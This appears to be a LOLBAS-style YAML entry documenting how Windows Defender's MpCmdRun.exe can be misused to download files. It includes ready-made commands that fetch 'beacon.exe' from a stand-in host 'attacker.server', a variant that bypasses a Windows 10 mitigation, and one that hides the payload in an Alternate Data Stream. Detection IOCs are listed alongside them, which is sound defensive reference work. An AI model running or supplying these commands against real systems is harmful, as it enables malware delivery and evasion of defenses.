---
Name: MpCmdRun.exe
Description: Binary part of Windows Defender. Used to manage settings in Windows Defender
Author: 'Oddvar Moe'
Created: '09/03/2020'
Commands:
  - Command: MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\temp\\beacon.exe
    Description: Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path)
    Usecase: Download file
    Category: Download
    Privileges: User
    MitreID: T1105
    MitreLink: https://attack.mitre.org/wiki/Technique/T1105
    OperatingSystem: Windows 10
  - Command: copy "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" C:\Users\Public\Downloads\MP.exe && chdir "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\" && "C:\Users\Public\Downloads\MP.exe" -DownloadFile -url https://attacker.server/beacon.exe -path C:\Users\Public\Downloads\evil.exe
    Description: Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path) [updated version to bypass Windows 10 mitigation]
    Usecase: Download file
    Category: Download
    Privileges: User
    MitreID: T1105
    MitreLink: https://attack.mitre.org/wiki/Technique/T1105
    OperatingSystem: Windows 10
  - Command: MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\temp\\nicefile.txt:evil.exe
    Description: Download file to machine and store it in Alternate Data Stream
    Usecase: Hide downloaded data inton an Alternate Data Stream
    Category: ADS
    Privileges: User
    MitreID: T1096
    MitreLink: https://attack.mitre.org/wiki/Technique/T1096
    OperatingSystem: Windows 10
Full_Path:
  - Path: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.4-0\MpCmdRun.exe
  - Path: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.7-0\MpCmdRun.exe
  - Path: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe
Code_Sample: 
  - Code: 
Detection: 
  - IOC: MpCmdRun storing data into alternate data streams.
  - IOC: MpCmdRun getting a file from a remote machine or the internet that is not expected.
  - IOC: Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts launching mpcmdrun.exe.
  - IOC: Monitor for the creation of %USERPROFILE%\AppData\Local\Temp\MpCmdRun.log
  - IOC: User Agent is "MpCommunication"
Resources:
  - Link: https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-antivirus/command-line-arguments-microsoft-defender-antivirus
  - Link: https://twitter.com/mohammadaskar2/status/1301263551638761477
  - Link: https://twitter.com/Oddvarmoe/status/1301444858910052352
  - Link: https://twitter.com/NotMedic/status/1301506813242867720
Acknowledgement:
  - Person: Askar
    Handle: '@mohammadaskar2'
  - Person: Oddvar Moe
    Handle: '@oddvarmoe'
  - Person: RichRumble
    Handle: ''
  - Person: Cedric
    Handle: '@th3c3dr1c'
---